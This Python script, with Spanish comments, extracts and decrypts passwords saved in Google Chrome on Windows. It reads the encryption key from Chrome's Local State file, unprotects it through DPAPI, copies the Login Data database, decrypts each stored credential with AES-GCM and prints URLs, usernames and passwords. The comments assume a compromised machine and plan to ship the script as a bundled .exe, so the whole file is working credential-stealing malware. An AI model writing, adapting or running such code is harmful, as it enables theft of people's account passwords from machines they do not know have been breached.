import os, json, base64, sqlite3, logging, shutil
from Crypto.Cipher import AES
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData

'''
Las librerías externas no se instalan porque el script será ejecutado en una máquina Windows mediante un .exe que contendrá cada
dependencia.
'''

class ChromePasswordDecryptor:
    def __init__(self):
        # Se define la ruta de la base de datos donde está almacenada toda la info.
        self.db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'default', 'Login Data')
        # Con join se irá construyendo la ruta.

        # Se obtendrán las claves con las que se cifraron las contraseñas
        self.key = self.get_encryption_key()
    
    def get_encryption_key(self):
        # Si se comprometió la máquina y tenemos los privilegios de ese usuario, se podrá obtener la clave de cifrado.
        local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
        # os.environ => se accede al entorno del OS para acceder a la ruta de la clave de cifrado en Local State
        try:
            with open(local_state_path, 'r', encoding='utf-8') as file:
                local_state = json.loads(file.read())
            # La clave estará codificada en base 64 y por eso de tiene que decodificar
            key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            key = key[5:]
            return CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception as e:
            logging.error(f'[!] Fallo al obtener la clave de cifrado: {e}')
            return None
    
    # Comenzar a descifrar contraseñas
    def decrypt_password(self, password):
        try:
            # Primero se obtiene un vector de inicialización
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(self.key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(CryptUnprotectData(password, None, None, None, 0)[0])
            except:
                return ''
    
    @staticmethod # Será estático porque no hará flta que interactúe con otros elementos de la clase
    def get_chrome_datetime(chromedate):
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except:
            return None

    def extract_saved_passwords(self):
        # Ruta temporal para almacenar la db y no trabajar con la original
        temp_db_path = 'Chrome.db'
        # Se copia el archivo original en la ruta temporal
        try:
            shutil.copyfile(self.db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            # Se van a ejecutar consultas SQL
            cursor.execute('SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created')
            # Se recorren los elementos obtenidos previamente
            for row in cursor.fetchall():
                # yield en Python es una instrucción que convierte una función en generador, devolviendo valores uno a uno sin finalizar su ejecución.
                yield {
                    'origin_url': row[0],
                    'action_url': row[1],
                    'username': row[2],
                    'password': self.decrypt_password(row[3]),
                    'date_created': self.get_chrome_datetime(row[4]),
                    'date_last_used': self.get_chrome_datetime(row[5])
                }
            cursor.close()
            conn.close()
        except Exception as e:
            logging.error(f'[!] Error al extraer las contraseñas de Chrome. {e}')
        finally:
            try:
                os.remove(temp_db_path)
            except Exception as e:
                logging.error(f'[!] Error al eliminar la base de datos temporal. {e}')
 

def main():
    # La config básica es para estabelcer un formato
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
    decryptor = ChromePasswordDecryptor()
    for password_info in decryptor.extract_saved_passwords():
        print(password_info)

if __name__ == "__main__":
    main()